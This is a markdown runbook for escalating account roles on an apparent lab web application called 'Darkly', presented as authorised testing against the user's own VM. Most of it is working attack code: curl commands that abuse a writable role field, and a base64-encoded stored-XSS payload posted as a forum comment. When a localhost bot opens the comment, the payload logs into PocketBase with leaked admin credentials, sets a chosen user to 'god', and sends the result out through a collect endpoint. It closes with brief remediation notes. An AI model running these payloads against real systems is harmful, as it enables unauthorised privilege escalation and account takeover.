# Darkly — God / Staff escalation runbook

How to raise any account to `cadet`, `staff`, or `god`. Authorised testing against the user's lab VM.

**Target:** `http://192.168.1.155:4942` — FastAPI frontend + PocketBase backend on `127.0.0.1:8090` (localhost-only).

Role ladder: `visitor` < `student` < `cadet` < `staff` < `god`.

---

## Why two routes

The app exposes `PATCH /api/profile` with a writable `role` field, BUT it guards it:
- `student -> cadet` is allowed (one step).
- `student -> staff`/`god` is rejected: `403 role not assignable` / "Staff and god accounts use 42 SSO".

That guard is **only in the app**. The PocketBase database underneath has no such rule, and its admin credentials leaked, so writing `role` directly in the DB bypasses the guard entirely. Therefore:

- **Route A (app):** gets you to `cadet` — quick, no bot.
- **Route B (PocketBase):** gets you to `staff` or `god` — the real escalation.

> Note: the session JWT is forgeable (secret `42network`), but the app re-reads `role` from the DB, so forging a `role` claim in the token does NOT work. You must change the DB.

---

## Prerequisites

- A logged-in account cookie (any student). Example jar: `jdoe.txt`. Re-login if stale:
  ```bash
  TARGET=192.168.1.155
  curl -s -c jdoe.txt -o /dev/null -X POST "http://$TARGET:4942/login" \
    --data-urlencode "identity=jdoe" --data-urlencode "password=PwnedPass123"
  ```
- The target account's PocketBase record id (`TARGET_ID`). Find it in the profile URL `/profile/<id>` or the `/admin` table. jdoe = `z4p1cnx47mfy50f`.
- Leaked PocketBase admin creds: `admin@42network.local` / `Darkly42Admin!`.

---

## Route A — self-promote to cadet (app, no bot)

```bash
TARGET=192.168.1.155
curl -s -i -b jdoe.txt -X PATCH "http://$TARGET:4942/api/profile" \
  -H 'Content-Type: application/json' -d '{"role":"cadet"}'
# 200 OK, record shows "role":"cadet"
```
Verify: `curl -s -b jdoe.txt "http://$TARGET:4942/staff" | grep role-pill` → should show `cadet`.

---

## Route B — promote to staff / god (via PocketBase)

PocketBase is localhost-only, so you can't call it from your machine. You relay the call through the **moderation bot**, which runs on `127.0.0.1` and executes any script in a forum comment (stored XSS).

```bash
TARGET=192.168.1.155
# --- edit these ---
TARGET_ID=z4p1cnx47mfy50f     # whose role to change
NEW_ROLE=god                  # god or staff
THREAD=6viy7xi64gxpan3        # any forum thread id

# build payload (UNquoted heredoc so the shell vars expand into the JS)
JS=$(cat <<JS
(async()=>{
  let a=await fetch('http://127.0.0.1:8090/api/admins/auth-with-password',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({identity:'admin@42network.local',password:'Darkly42Admin!'})});
  let j=await a.json();
  let u=await fetch('http://127.0.0.1:8090/api/collections/users/records/$TARGET_ID',{method:'PATCH',headers:{'Content-Type':'application/json','Authorization':j.token},body:JSON.stringify({role:'$NEW_ROLE'})});
  let r=await u.text();
  fetch('/api/collect?c='+encodeURIComponent('ROLE:'+r.slice(0,200)));
})()
JS
)
B64=$(printf '%s' "$JS" | base64 | tr -d '\n')

# plant it as a comment (any logged-in student cookie)
curl -s -b jdoe.txt -X POST "http://$TARGET:4942/forum/$THREAD/comment" \
  --data-urlencode "content=<img src=x onerror=\"eval(atob('$B64'))\">"

# the bot opens the comment within ~60s; then read the result
sleep 65
curl -s "http://$TARGET:4942/api/collect" | grep -o 'ROLE:[^"]*' | tail -1
```

Expected: a `ROLE:...` entry containing `"role":"god"` (or `"staff"`).

---

## Verify

```bash
TARGET=192.168.1.155
# if it's your own account, just refresh the page / re-check:
curl -s -b jdoe.txt "http://$TARGET:4942/staff" | grep -iE 'role-pill'   # -> role-god
# /admin opens for staff/god:
curl -s -o /dev/null -w "admin=%{http_code}\n" -b jdoe.txt "http://$TARGET:4942/admin"
```
The role is read from the DB on each request, so a page refresh reflects the new role immediately (no re-login needed).

---

## Troubleshooting

- **No `ROLE:` entry after 65s** — the bot is slow/flaky after repeated use. Repost to a fresh thread id (`r8y1ib6ub8g47u2`, `o9ah3kb7vo64obl`). Keep the exfil string short (long `/api/collect?c=` query strings get dropped).
- **Comment post needs auth** — use a valid student cookie; re-login if it 302s to `/login`.
- **PocketBase auth fails** — confirm creds from `/internal/config` (re-leak via the bot if rotated): they were `admin@42network.local` / `Darkly42Admin!`.
- **PocketBase version** is 0.22.4 — admin auth path is `/api/admins/auth-with-password`. (0.23+ uses `/api/collections/_superusers/auth-with-password`.)
- **You only need `cadet`** — skip the bot, use Route A.

---

## Underlying fixes (for the write-up)

- Never accept `role` (or any privilege field) from client input — allow-list self-editable fields.
- Don't store backend admin credentials where the app can be made to fetch them; isolate PocketBase and rotate the password.
- Enforce authorisation at the data layer, not only in the web app.
